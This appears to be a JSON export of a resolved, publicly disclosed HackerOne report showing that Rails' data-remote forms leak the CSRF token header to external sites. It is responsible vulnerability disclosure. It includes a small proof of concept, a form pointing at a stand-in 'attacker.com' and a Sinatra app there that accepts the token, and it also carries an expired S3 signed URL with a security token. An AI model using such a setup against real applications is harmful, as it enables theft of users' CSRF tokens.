{"id":189878,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODk4Nzg=","url":"https://hackerone.com/reports/189878","title":"CSRF header is sent to external websites when using data-remote forms","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2016-12-09T16:27:17.706Z","submitted_at":"2016-12-09T16:27:17.706Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mastahyeti","url":"/mastahyeti","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":22,"url":"https://hackerone.com/rails","handle":"rails","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Ruby on Rails","twitter_handle":null,"website":"http://rubyonrails.org/security","about":"Web development that doesn't hurt."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-8167","CVE-2015-1840"],"singular_disclosure_disabled":false,"disclosed_at":"2020-05-26T22:38:40.225Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-05-18T19:40:25.372Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Looks like there is a regression in the fix for CVE-2015-1840 ([H1 report](https://hackerone.com/reports/49935)). The origin isn't being checked before adding a CSRF header to `data-remote` forms. I noticed this when checking out the new rails-ujs repo.\n\nExample Rails template:\n\n```\n\u003c%= form_tag \"http://attacker.com\", remote: true do %\u003e\n  \u003cbutton type=submit\u003esubmit\u003c/button\u003e\n\u003c% end %\u003e\n```\n\nExample http://attacker.com app\n\n```\nrequire \"sinatra\"\n\noptions '/*' do\n  headers['Access-Control-Allow-Origin'] = \"*\"\n  headers['Access-Control-Allow-Methods'] = \"POST\"\n  headers['Access-Control-Allow-Headers'] =\"x-csrf-token\"\nend\n\npost '/*' do\n  \"foo\"\nend\n```\n\nWhen the form is submitted, an XHR request to attacker.com is sent, including the `X-CSRF-Token` header.\n\nPS: @tenderlove told me to submit this here. I shouldn't get paid since I'm one of the GitHub folks who reviews these H1 submissions now.","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-06-17T19:40:25.472Z","allow_singular_disclosure_after":-41537819.09732879,"singular_disclosure_allowed":true,"vote_count":2,"voters":["foobar7","its_afolic"],"severity":{"rating":"low","score":3.1,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"low","integrity":"none","availability":"none"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4996290,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hey @mastahyeti,\n\nHackerOne is now partnering with Ruby on Rails to help them manage their incoming security vulnerability reports. As such, we are also helping clear out backlogged reports like this. Can you please check to see if this reported issue is still valid? If it's valid, we'll have our team triage it accordingly. If it's no longer valid, please close it out as N/A (without penalty).\n\nThanks in advance!\n-Alek (H1 Program Manager)","automated_response":false,"created_at":"2019-06-04T20:34:56.061Z","updated_at":"2019-06-04T20:34:56.061Z","actor":{"username":"mikhail1519","cleared":false,"url":"/mikhail1519","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4996444,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"I have not revalidated the submission, but I have no reason to believe that it has been fixed. ","automated_response":false,"created_at":"2019-06-04T21:11:56.400Z","updated_at":"2019-06-04T21:11:56.400Z","actor":{"username":"mastahyeti","cleared":false,"url":"/mastahyeti","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5285013,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @mastahyeti \n\nCan you confirm if this issue is still present? This will help us determine how to validate and handle the report. \n\nThanks,\n@orangeband ","automated_response":false,"created_at":"2019-07-09T21:56:24.153Z","updated_at":"2019-07-09T21:56:24.153Z","actor":{"username":"orangeband","cleared":false,"url":"/orangeband","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/390/540/b55c564a8a6f8099d28ea9afa41d197ad0031fc3_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5294531,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"I validated that this is still an issue on the latest release of Rails (5.2.3) using the steps described in the OP.\n\n","automated_response":false,"created_at":"2019-07-10T21:44:51.703Z","updated_at":"2019-07-10T21:44:51.703Z","actor":{"username":"mastahyeti","cleared":false,"url":"/mastahyeti","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":526195,"filename":"Screen_Shot_2019-07-10_at_4.43.24_PM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/526/195/9c9de079426268e5d0fcfdf46831f78ceff54f91/Screen_Shot_2019-07-10_at_4.43.24_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-07-10_at_4.43.24_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-07-10_at_4.43.24_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY5I5ZOTN%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T135724Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQCqf43kV8RTzzmWR1TXeEdpx%2Fd5zGOFNpfZDgSM2xJuCQIhAMLYAxjZR7PGO9btJ9wGFbOqf%2FTbE2pC%2FdkQgyPDWZD8KoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgzmKazqBIClFAMqc2Iq1wNPV39BSW59qP%2ByHsmBjxY6m%2Fb7a6U5448PKOSe8dVf6ZB9c%2BLac%2F0Gz8ADXdDYKsvWZv%2FAmBj5%2FhHzWjVphb45t9jx%2BhpJI0AITzRmRN5aq7TLFOZDfehY6xr7qR34eKZAu9XJrbi4QdAu%2BNSUgERhmM4muMj19K4msZk8sFVbAKLF%2BU6gGnywSDktUJmbSxfnY6ZesCS5elWm1qPvYsKCbrl5y57ovXEaa7NAn6XfLDrVTRtpY8qRzPQbURfe%2FnNfBCEGQCwCuB8zQszv%2B2O4z6L6fFCLSm2gccXmLLJqlgBN7EwqRjH0XLKpn1vWKBfmNtQJMcfcBOgesSBjohFRDqs9VtzSm8Ar%2FZ3tQRyj3E5FFBVh7SFXfbH0zIPhcJnR7J%2Ft20n0T0BoFfeC4Lh04EDdGi1xF35UayBRbz0euxaVcKV0UA%2BktOyHmbRzgaonWDeZCOaJtjFZCGnWooRLI6KrYUmAIMrnyQoKS2q8DQKxvweDK7%2FuWfo1ovNRy%2BMy3v8N%2B%2B6q1M2DXNkYeXZoalrKF%2BzGC2C%2FRVd1z2LoHJiVHopIG7T4Lyax%2BX9LY1Z9oVqxPxTo9SgiI1kD69%2Bl5MKWzogETScQuH%2Bvi36SPh1QbdmYvwgw5O6QiwY6pAEabkl2EyHSmga%2FQVBclzYljmd0Pvwag9ITi%2BNlOViZyzeqV8k%2F8Q8ny0OOVtCp3iCSdWDf1LHd%2BqKtTjKS7CIODHKRsg4m3sx7QNZBHT5H00n5U2ZVgN4N9m3YxiNqVHw1I0Jv0KF1%2BS2XFhkFHuxBokXIzihowuz57pmo5yGw3bX16HVqCrlEZdpJDLSrVWPAr55aHcggcNaCjNyYlZGc9VtWCw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=0d847a6d9012c84d6c74d44034783958dcfad6076b2e7a7e952c8981f1661076"}],"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5357054,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @mastahyeti,\n\nThank you for your reply. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@beagle ","automated_response":false,"created_at":"2019-07-18T11:00:12.928Z","updated_at":"2019-07-18T11:00:12.928Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5370085,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2019-07-19T12:13:12.221Z","updated_at":"2019-07-19T12:13:12.221Z","additional_data":{"old_severity":"Medium","new_severity":"Low (3.1)","old_severity_id":12855,"new_severity_id":467380},"actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5370087,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"I was able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nKind regards,\n@beagle  ","automated_response":false,"created_at":"2019-07-19T12:13:18.366Z","updated_at":"2019-07-19T12:13:18.366Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5370092,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2019-07-19T12:14:02.946Z","updated_at":"2019-07-19T12:14:02.946Z","additional_data":{"old_title":"CVE-2015-1840 regression","new_title":"CSRF header is sent to external websites when using data-remote forms"},"actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8038247,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Shipped","automated_response":false,"created_at":"2020-05-18T16:10:03.309Z","updated_at":"2020-05-18T16:10:03.309Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"mastahyeti","url":"/mastahyeti"},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8040952,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"We work coworkers when this was reported so I'm setting this bounty as ineligible. üôáüèª‚Äç‚ôÇÔ∏è","automated_response":false,"created_at":"2020-05-18T19:40:19.155Z","updated_at":"2020-05-18T19:40:19.155Z","actor":{"url":"/rails","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Ruby on Rails"}},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8040953,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-05-18T19:40:25.396Z","updated_at":"2020-05-18T19:40:25.396Z","first_to_agree":true,"actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8112518,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","automated_response":false,"created_at":"2020-05-26T22:38:40.155Z","updated_at":"2020-05-26T22:38:40.155Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}